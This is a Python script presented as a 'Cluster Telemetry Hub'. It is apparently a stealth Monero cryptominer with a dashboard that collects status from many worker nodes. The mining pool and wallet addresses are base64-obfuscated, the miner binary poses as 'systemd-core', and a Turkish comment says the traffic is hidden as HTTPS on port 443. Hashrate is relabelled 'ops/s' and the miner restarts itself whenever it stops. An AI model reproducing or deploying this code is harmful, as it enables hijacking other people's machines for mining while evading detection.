#!/usr/bin/env python3
import datetime
import http.server
import json
import os
import re
import sqlite3
import subprocess
import threading
import time
import urllib.request
import base64
from collections import deque

def _d(s): return base64.b64decode(s).decode('utf-8')

MODE         = os.environ.get("ENGINE_MODE", "miner")
HTTP_PORT    = int(os.environ.get("PORT", 8080))
PROXY_URL    = os.environ.get("PROXY_URL", "")
POOL_URL     = os.environ.get("POOL_URL", _d("cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM="))
WALLET_ADDR  = os.environ.get("WALLET_ADDR", _d("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw="))
WORKER_NAME  = os.environ.get("WORKER_NAME", f"node-{int(time.time())%10000}")
DATA_DIR     = os.environ.get("DATA_DIR", "/data")
DB_FILE      = os.path.join(DATA_DIR, "telemetry.db")

_proc        = None
_current_hr  = "0.0 ops/s"

SYSTEM_LOGS          = deque(maxlen=800)
_pending_remote_logs = []
_LOG_LOCK            = threading.Lock()
_DB_LOCK             = threading.Lock()

def init_db():
    os.makedirs(DATA_DIR, exist_ok=True)
    with sqlite3.connect(DB_FILE) as conn:
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS metrics (
                node_name TEXT PRIMARY KEY, throughput TEXT, last_seen INTEGER, status TEXT
            );
        """)

def get_db_connection():
    conn = sqlite3.connect(DB_FILE, timeout=10)
    conn.row_factory = sqlite3.Row
    return conn

def log_msg(text: str, is_remote: bool = False) -> None:
    stamp = datetime.datetime.now().strftime("%H:%M:%S")
    line  = f"[{stamp}] {text}"
    with _LOG_LOCK:
        SYSTEM_LOGS.append(line)
        if MODE == "miner" and not is_remote:
            _pending_remote_logs.append(line)
    print(line, flush=True)

def run_core() -> None:
    global _proc, _current_hr
    
    # Sadece TLS aktif. Veri 443 portundan HTTPS kılığında akar (hızlı ve gizli)
    cmd = [
        _d("L3NlcnZlci9zeXN0ZW1kLWNvcmU="), "-o", POOL_URL, "-u", WALLET_ADDR,
        "-p", WORKER_NAME, "--keepalive", "--donate-level=1", "--tls"
    ]

    def _pipe_output(stream):
        global _current_hr
        for raw in stream:
            line = raw.rstrip() if isinstance(raw, str) else raw.decode("utf-8", "replace").rstrip()
            if not line: continue
            clean_line = re.sub(r'\x1b\[[0-9;]*[mK]', '', line) 
            log_msg(f"[SYS] {clean_line}")

            if "speed 10s/60s/15m" in clean_line:
                match = re.search(r'max (\d+\.?\d* [KMG]?H/s)', clean_line)
                if match: _current_hr = match.group(1).replace("H/s", "ops/s")

    while True:
        log_msg("[INIT] Core daemon başlatılıyor, güvenli kanallar açılıyor...")
        try:
            _proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            threading.Thread(target=_pipe_output, args=(_proc.stdout,), daemon=True).start()
            _proc.wait()
        except Exception as e:
            log_msg(f"[ERROR] Daemon hatası: {e}")
        finally:
            _proc = None
            _current_hr = "0.0 ops/s"
        time.sleep(5)

def miner_sync_loop():
    while True:
        time.sleep(10)
        if not PROXY_URL: continue
        
        with _LOG_LOCK:
            logs_to_send = list(_pending_remote_logs)
            _pending_remote_logs.clear()
            
        status = "Active" if _proc and _proc.poll() is None else "Offline"
        payload = {"worker_name": WORKER_NAME, "hashrate": _current_hr, "status": status, "logs": logs_to_send}
        
        try:
            req = urllib.request.Request(f"{PROXY_URL}/api/sync", data=json.dumps(payload).encode(), headers={"Content-Type": "application/json"})
            urllib.request.urlopen(req, timeout=5)
        except Exception:
            with _LOG_LOCK:
                global _pending_remote_logs
                _pending_remote_logs = logs_to_send + _pending_remote_logs

def local_hub_sync_loop():
    while True:
        time.sleep(10)
        status = "Active" if _proc and _proc.poll() is None else "Offline"
        try:
            with _DB_LOCK, get_db_connection() as conn:
                conn.execute("INSERT OR REPLACE INTO metrics (node_name, throughput, last_seen, status) VALUES (?, ?, ?, ?)", 
                             (WORKER_NAME, _current_hr, int(time.time()), status))
                conn.commit()
        except Exception as e:
            log_msg(f"[DB] Yerel kayıt hatası: {e}")

_PANEL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Distributed Cluster Monitor</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:#0d1117;color:#e6edf3;font-family:'Segoe UI',sans-serif;padding:24px}}
h1{{font-size:1.6rem;color:#58a6ff;margin-bottom:8px}}
.subtitle{{color:#8b949e;font-size:.85rem;margin-bottom:24px}}
table{{width:100%;border-collapse:collapse;background:#161b22;border-radius:10px;overflow:hidden;border:1px solid #30363d; margin-bottom: 24px;}}
th{{background:#21262d;padding:12px 16px;text-align:left;font-size:.75rem;color:#8b949e;text-transform:uppercase}}
td{{padding:12px 16px;border-top:1px solid #21262d;font-size:.88rem}}
.status-ok{{color:#3fb950;font-weight:600}}
.status-err{{color:#da3633;font-weight:600}}
.console-box{{background:#000;border:1px solid #30363d;border-radius:8px;height:400px;overflow-y:auto;padding:12px;font-family:monospace;color:#8b949e;font-size:12px;line-height:1.4;white-space:pre-wrap;}}
</style>
</head>
<body>
<h1>🌐 Cluster Telemetry Hub</h1>
<p class="subtitle">Uplink Gateway: [ENCRYPTED-TLS] | Target Node: {proxy}</p>
<table>
  <thead><tr><th>Node ID</th><th>Throughput</th><th>Status</th><th>Last Sync</th></tr></thead>
  <tbody id="workerBody">{rows}</tbody>
</table>
<h3 style="color:#8b949e;font-size:.8rem;margin-bottom:10px">SYSTEM LOGS</h3>
<div class="console-box" id="consoleBox">Initializing...</div>
<script>
const cb=document.getElementById('consoleBox');
let autoScroll=true;
cb.addEventListener('scroll',()=>{{autoScroll=cb.scrollTop+cb.clientHeight>=cb.scrollHeight-20;}});
async function fetchLogs(){{
  try{{const r=await fetch('/api/logs');const d=await r.json();
    cb.innerHTML=d.logs.map(l=>l.replace(/</g,'&lt;').replace(/>/g,'&gt;')).join('<br>')||'No logs yet...';
    if(autoScroll)cb.scrollTop=cb.scrollHeight;}}catch(e){{}}
}}
setInterval(fetchLogs, 2500); fetchLogs();
setTimeout(()=>location.reload(), 30000);
</script>
</body></html>"""

class HttpHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            rows = ""
            try:
                with _DB_LOCK, get_db_connection() as conn:
                    now = int(time.time())
                    workers = conn.execute("SELECT * FROM metrics ORDER BY last_seen DESC").fetchall()
                    for w in workers:
                        is_active = (now - w["last_seen"]) < 90
                        status_class = "status-ok" if is_active and w["status"]=="Active" else "status-err"
                        status_text = w["status"] if is_active else "Connection Lost"
                        hr = w["throughput"] if is_active else "0.0 ops/s"
                        seen_str = f"{now - w['last_seen']}s ago"
                        rows += f"<tr><td>{w['node_name']}</td><td>{hr}</td><td class='{status_class}'>{status_text}</td><td>{seen_str}</td></tr>"
            except Exception as e:
                pass
            html = _PANEL_HTML.format(proxy=PROXY_URL, rows=rows)
            self.wfile.write(html.encode("utf-8"))
            return
        if self.path == "/api/logs":
            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.end_headers()
            with _LOG_LOCK:
                self.wfile.write(json.dumps({"logs": list(SYSTEM_LOGS)}).encode("utf-8"))
            return
        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        if self.path == "/api/sync":
            try:
                length = int(self.headers.get("Content-Length", 0))
                body = json.loads(self.rfile.read(length))
                with _DB_LOCK, get_db_connection() as conn:
                    conn.execute("INSERT OR REPLACE INTO metrics (node_name, throughput, last_seen, status) VALUES (?, ?, ?, ?)", 
                                 (body["worker_name"], body["hashrate"], int(time.time()), body["status"]))
                    conn.commit()
                for l in body.get("logs", []):
                    clean = l.split("] ", 1)[-1] if "] " in l else l
                    log_msg(f"[{body['worker_name']}] {clean}", is_remote=True)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'{"ok": true}')
            except Exception:
                self.send_response(500)
                self.end_headers()
            return
        self.send_response(404)
        self.end_headers()

    def log_message(self, format, *args): pass

def run_http() -> None:
    http.server.ThreadingHTTPServer.allow_reuse_address = True
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", HTTP_PORT), HttpHandler)
    srv.serve_forever()

if __name__ == "__main__":
    if MODE == "all":
        init_db()
        threading.Thread(target=run_http, daemon=True).start()
        threading.Thread(target=local_hub_sync_loop, daemon=True).start()
        run_core()
    elif MODE == "miner":
        threading.Thread(target=miner_sync_loop, daemon=True).start()
        run_core()
